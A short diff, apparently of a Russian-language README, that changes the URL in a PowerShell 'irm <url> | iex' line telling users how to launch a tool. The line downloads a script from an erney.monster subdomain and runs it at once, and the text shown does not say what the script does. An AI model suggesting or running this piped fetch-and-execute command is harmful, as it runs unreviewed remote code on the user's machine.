@@ -3,5 +3,5 @@
 
 Для вызова прописать в PowerShell:
 ```
-irm https://aa.erney.monster/ | iex
+irm https://powertoy.erney.monster | iex
 ```
